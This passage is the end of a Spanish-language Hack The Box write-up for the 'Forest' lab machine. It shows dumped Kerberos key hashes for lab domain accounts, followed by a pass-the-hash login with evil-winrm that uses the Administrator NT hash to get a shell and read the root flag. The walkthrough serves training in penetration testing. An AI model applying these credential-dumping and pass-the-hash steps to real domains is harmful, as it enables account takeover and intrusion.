+htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c  
+htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
+pwned:aes256-cts-hmac-sha1-96:c8e5a19d9c94a83791ebe2c85f6902bb0576bd3dedc4b135415a9f0daac35bd5
+pwned:aes128-cts-hmac-sha1-96:09264a35bfc62b9d32b18877e12c107b
+pwned:des-cbc-md5:49e60b9e5175d532
+FOREST$:aes256-cts-hmac-sha1-96:eb4b0467baac3d6c1e97075126302d5d4c6e4769c8640a90641b4766137dd88f
+FOREST$:aes128-cts-hmac-sha1-96:3f9e0c80747c737e8111f6bc3573c0dd
+FOREST$:des-cbc-md5:894a522f51c4628a
+EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01$:des-cbc-md5:8c45f44c16975129
+[*] Cleaning up...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos hacer un <code class="language-plaintext highlighter-rouge">passthehash</code> proporcionando solo el hash <code class="language-plaintext highlighter-rouge">NT</code> de <code class="language-plaintext highlighter-rouge">Administrator</code> para conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y obtener una shell además de la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+aa8**************************cc6
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
